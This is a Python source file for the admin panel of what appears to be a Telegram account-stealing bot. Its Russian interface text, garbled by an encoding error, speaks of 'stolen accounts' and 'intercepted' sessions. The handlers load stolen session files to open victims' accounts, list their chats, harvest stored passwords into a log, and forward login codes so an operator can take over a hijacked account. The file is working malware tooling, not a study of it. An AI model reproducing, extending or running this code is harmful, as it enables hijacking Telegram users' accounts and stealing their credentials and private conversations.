from tgbot.dialogs.dialog import dialog, migrate
from tgbot.keyboards.keyboard import keyboard
from tgbot.services.get_text import gText
from tgbot.services.Session import ImportSession

from tgbot.states.State import State
from tgbot.services.Log import Log

import phonenumbers
from phonenumbers.phonenumberutil import (
    region_code_for_country_code,
)


async def menu(message, state, repo, edit):
	title = "‚öôÔ∏è –ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∞"
	text = [
		"–ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –æ—Ç—Å–ª–µ–¥–∏—Ç—å –≤—Å—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –±–æ—Ç–∞, –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —É–∫—Ä–∞–¥–µ–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã –∏ –º–Ω–æ–≥–æ –¥—Ä—É–≥–æ–µ.\n",
		"<b>üë§ –ê–∫–∫–∞—É–Ω—Ç—ã</> - –≤—ã–≤–µ—Å—Ç–∏ –≤–µ—Å—å —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤",
		"<b>üîç –ß–µ–∫–Ω—É—Ç—å</> - —á–µ–∫–Ω—É—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π –∞–∫–∫, –ø–æ–∏—Å–∫ –ø–æ ID –∏–ª–∏ –Ω–æ–º–µ—Ä—É",
		"<b>üìà –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞</> - –æ–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞",
		"<b>üì§ –≠–∫—Å–ø–æ—Ä—Ç</> - –ø–æ–ª—É—á–∏—Ç—å –∞—Ä—Ö–∏–≤ —Å–µ—Å—Å–∏–π"
	]
	await state.update_data(page=1)

	markup = await keyboard.admin.main()
	await dialog(message, edit=edit, text=text, markup=markup, title=title)


async def accs(message, state, repo, edit):
	title = "üë§ –ê–∫–∫–∞—É–Ω—Ç—ã"
	accs = await repo.list_users_of_sessions()
	text = [
		"–ó–¥–µ—Å—å –≤—ã–≤–µ–¥–µ–Ω —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤.",
		f"üëâ –î–æ—Å—Ç—É–ø–Ω–æ: <b>{len(accs)}</>\n"
		"‚úÖ - —É—Å–ø–µ—à–Ω—ã–π –≤—ã—Ö–æ–¥ –∏–∑ –≤—Å–µ—Ö —Å–µ—Å—Å–∏–π",
		"‚ùóÔ∏è - –æ–∂–∏–¥–∞–µ—Ç –≤—ã—Ö–æ–¥–∞ –∏–∑ –≤—Å–µ—Ö —Å–µ—Å—Å–∏–π"
	]

	markup = await keyboard.admin.accs(accs, state)
	await dialog(message, edit=True, text=text, markup=markup, title=title)


async def open_acc(message, state, repo, edit):
	select_user = (await state.get_data())['_select']
	
	await repo.del_sign_in(select_user)
	client = ImportSession().inject(select_user)

	await client.client.connect()
	user = await client.check_dialogs(message.bot.config)

	if not user:
		title = '‚ùóÔ∏è–ü—Ä–æ–∏–∑–æ—à–ª–∞ –∫–∞–∫–∞—è-—Ç–æ –æ—à–∏–±–∫–∞'
		text = [
			'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞—â–µ–Ω–∏–∏ –∫ –¥–∞–Ω–Ω–æ–º—É –∞–∫–∫–∞—É–Ω—Ç—É, –≤–æ–∑–º–æ–∂–Ω–æ —Å–µ—Å—Å–∏—è –Ω–µ–≤–∞–ª–∏–¥–Ω–∞ –∏–ª–∏ –∞–∫–∫–∞—É–Ω—Ç –±—ã–ª –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.\n',
			'<b>–•–æ—Ç–∏—Ç–µ –ª–∏ –í—ã —É–¥–∞–ª–∏—Ç—å –≤—Å–µ –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ–± —ç—Ç–æ–º –∞–∫–∫–∞—É–Ω—Ç–µ?</>'
		]
		markup = await keyboard.admin.delete_acc(select_user)
	else:
		region = phonenumbers.parse('+' + str(client.meta['phone'].replace('+', '')))
		ses = (await repo.get_user(user['user'].id))['reset_auth']
		ses = "–ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–∞ ‚úÖ" if ses else "–û–∂–∏–¥–∞–µ—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ ‚ùóÔ∏è"
		title = f"üë§ –ê–∫–∫–∞—É–Ω—Ç {client.meta['user_id']}"
		text = [
			f"üìå –°–µ—Å—Å–∏—è: <b>{ses}</>\n",
			f"üë§ ID: <code>{user['user'].id}</>",
			f"üîπ Username: <b>{user['user'].username}</>",
			f"üì≤ –ù–æ–º–µ—Ä: <b>{client.meta['phone']}</>",
			f"üí° –°—Ç—Ä–∞–Ω–∞: <b>{region_code_for_country_code(region.country_code)}</>",
			f"‚≠êÔ∏è –ü—Ä–µ–º–∏—É–º: <b>{user['user'].is_premium}</>",
			f"‚ùóÔ∏è –°–∫–∞–º: <b>{user['user'].is_scam}</>"
		]

		text.append("\nüëá <b> –î–∏–∞–ª–æ–≥–∏ üëá</>\n")
		for i in ['channel', 'bot', 'private', 'group', 'supergroup']:
			if not i in user.keys():
				continue
			count = user[i]
			txt = {'channel': 'üîî –ö–∞–Ω–∞–ª—ã', 'bot': 'ü§ñ –ë–æ—Ç—ã', 'private': 'üí¨ –õ–∏—á–Ω—ã–µ', 'group': 'üë§ –ì—Ä—É–ø–ø—ã', 'supergroup': 'üë• –°—É–ø–µ—Ä–≥—Ä—É–ø–ø—ã'}[i]
			text.append(f'{txt}: <b>{count}</b>')

		text.append(f"\nüëâ –°–æ–æ–±—â–µ–Ω–∏—è –≤ –∏–∑–±—Ä–∞–Ω–Ω–æ–º: <b>{user['me']}</>")
		text.append(f"üëâ –ê–¥–º–∏–Ω-–ø—Ä–∞–≤–∞: <b>{user['is_creator']}</> (–∏–∑–±—Ä–∞–Ω–Ω–æ–µ —É—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è)\n")

		if user['find'] != '':
			text.append(f"üîç <b>–ù–∞–π–¥–µ–Ω–Ω—ã–µ –¥–∏–∞–ª–æ–≥–∏:</b> {user['find']}")
		await client.client.disconnect()
		markup = await keyboard.admin.select(select_user)

	#markup = await keyboard.admin.accs(accs, state)
	await dialog(message, edit=True, text=text, markup=markup, title=title)
	

async def delete_acc(message, state, repo, edit):
	select_user = (await state.get_data())['_select']
	await repo.delete_user_of_phone(select_user)
	await State.admin.accs.set()
	await migrate(
		message=message,
		state=state,
		repo=repo,
		edit=True
	)


async def acc_check_pass(message, state, repo, edit):
	await message.delete()
	select_user = (await state.get_data())['_select']
	client = ImportSession().inject(select_user)
	await client.client.connect()
	await Log(message).passwords(await client.check_passwords())
	await client.client.disconnect()

	await State.admin.open_acc.set()
	await migrate(
		message=message,
		state=state,
		repo=repo,
		edit=False
	)


async def acc_sign_in(message, state, repo, edit):
	await message.delete()
	select_user = (await state.get_data())['_select']
	client = ImportSession().inject(select_user)
	await client.client.connect()
	count = await client.get_support()
	await client.client.disconnect()
	await repo.sign_in(select_user, count)
	title = 'üì≤ –í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç'
	text = [
		f"–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä <code>{select_user}</> –∏ –∂–¥–∏—Ç–µ –∫–æ–¥ –¥–ª—è –≤—Ö–æ–¥–∞ –≤ –∞–∫–∫–∞—É–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–¥–µ—Ç –≤ —ç—Ç–æ—Ç —á–∞—Ç."
	]
	markup = await keyboard.admin.back_to_open_acc()
	await dialog(message, edit=True, text=text, markup=markup, title=title)


async def dialog_admin(state, message, current_state, repo, edit: bool=True):
	if current_state == State.admin.main.state:
		await menu(message, state, repo, edit)
	elif current_state == State.admin.accs.state:
		await accs(message, state, repo, edit)
	elif current_state == State.admin.open_acc.state:
		await open_acc(message, state, repo, edit)
	elif current_state == State.admin.delete_acc.state:
		await delete_acc(message, state, repo, edit)

	elif current_state == State.admin.acc_check_pass.state:
		await acc_check_pass(message, state, repo, edit)
	elif current_state == State.admin.acc_sign_in.state:
		await acc_sign_in(message, state, repo, edit)

	
